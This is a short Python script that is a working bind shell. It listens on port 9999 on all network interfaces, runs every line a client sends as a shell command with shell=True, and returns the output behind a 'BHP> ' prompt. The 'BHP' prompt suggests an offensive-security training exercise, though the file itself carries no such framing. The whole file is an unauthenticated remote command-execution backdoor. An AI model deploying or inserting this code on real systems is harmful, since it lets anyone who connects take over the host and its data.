import socket
import threading 
import subprocess

IP = '0.0.0.0'
PORT = 9999

def sock_handler(client_socket):
    with client_socket as sock:
        while True:
            request = sock.recv(4069).decode().strip()
            
            if not request:
                break
            
            print(request)
            try:
                output = subprocess.check_output(request, shell=True, stderr=subprocess.STDOUT)
            except Exception as e:
                output = str(e).encode()
                
            sock.send(output + b'\nBHP> ')

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server.bind((IP, PORT))
server.listen(5)
while True:
    client_socket, addr = server.accept()
    client_handle = threading.Thread(target=sock_handler, args=(client_socket, ))
    client_handle.start()
